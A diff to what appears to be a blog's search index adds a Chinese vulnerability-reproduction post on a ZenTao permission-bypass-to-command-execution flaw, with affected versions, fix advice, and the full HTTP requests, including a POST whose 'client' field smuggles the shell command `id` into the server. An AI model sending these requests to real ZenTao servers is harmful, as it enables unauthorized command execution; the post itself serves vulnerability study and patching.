@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title></title>
+      <link href="/2023/03/05/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2023/03/05/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>禅道是第一款国产的开源项目管理软件，它的核心管理思想基于敏捷方法scrum，内置了产品管理和项目管理，同时又根据国内研发现状补充了测试管理、计划管理、发布管理、文档管理、事务管理等功能，在一个软件中就可以将软件研发中的需求、任务、bug、用例、计划、发布等要素有序的跟踪管理起来，完整地覆盖了项目管理的核心流程。</li></ul><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><ul><li>禅道17.4以下版本存在权限绕过到命令执行漏洞。该漏洞是由于禅道项目管理系统权限认证存在缺陷导致，攻击者可利用该漏洞在未授权的情况下，通过权限绕过在服务器执行任意命令。</li></ul><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><table><thead><tr><th>企业版</th><th>7.4以下的未知版本&lt;&#x3D;version&lt;&#x3D;8.0.beta1 8.0.beta2</th></tr></thead><tbody><tr><td>开源版</td><td>17.4以下的未知版本&lt;&#x3D;version&lt;&#x3D;18.0.beta1</td></tr><tr><td>旗舰版</td><td>3.4以下的未知版本&lt;&#x3D;version&lt;&#x3D;4.0.beta1</td></tr></tbody></table><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><ul><li>选择漏洞版本安装：<br><a href="https://www.zentao.net/download/zentaopms18.0.beta1-81862.html">https://www.zentao.net/download/zentaopms18.0.beta1-81862.html</a></li><li>安装文档：<br><a href="https://www.zentao.net/book/zentaopmshelp/40.html">https://www.zentao.net/book/zentaopmshelp/40.html</a></li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>1.首先依次发送如下两个请求，激活cookie信息：</p><pre><code class="json">GET /misc-captcha-user.html HTTP/1.1Host: ******Accept-Language: zh-CN,zh;q=0.9Accept-Encoding: gzip, deflateAccept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Connection: keep-aliveCookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=defaultPOST /repo-create.html HTTP/1.1Host: ******Content-Length: 113Accept-Language: zh-CN,zh;q=0.9Accept-Encoding: gzip, deflateReferer: http://******//repo-edit-1-0.htmlAccept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Connection: keep-aliveX-Requested-With: XMLHttpRequestCookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=defaultContent-Type: application/x-www-form-urlencodedproduct%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=</code></pre><p>2.发送如下请求，如果存在漏洞，则返回包中会包含命令执行的结果</p><pre><code class="json">POST /repo-edit-10000-10000.html HTTP/1.1Host: ******Content-Length: 26Accept-Language: zh-CN,zh;q=0.9Accept-Encoding: gzip, deflateReferer: http://******//repo-edit-1-0.htmlAccept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Connection: keep-aliveX-Requested-With: XMLHttpRequestCookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=defaultContent-Type: application/x-www-form-urlencodedSCM=Subversion&amp;client=`id`</code></pre><p>命令执行结果<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677988228317-d74943d4-dd54-4a93-8ce9-14de2c388932.png#averageHue=%23f0ecec&clientId=u08b105f6-fabe-4&from=paste&height=85&id=u96f6d8e3&name=image.png&originHeight=170&originWidth=662&originalType=binary&ratio=2&rotation=0&showTitle=false&size=57300&status=done&style=none&taskId=ua9211574-0f0a-4afe-808c-fbf08ff85c1&title=&width=331" alt="image.png"></p><h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>目前禅道官方已正式发布修复版本，建议受影响用户尽快升级至安全版本。</p><p>如不能升级，可在module&#x2F;common&#x2F;model.php文件中的echo $endResponseException-&gt;getContent();后面加上exit(); 来修复权限绕过漏洞。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全 </category>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 安全 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>内存管理</title>
       <link href="/2023/03/01/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
       <url>/2023/03/01/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
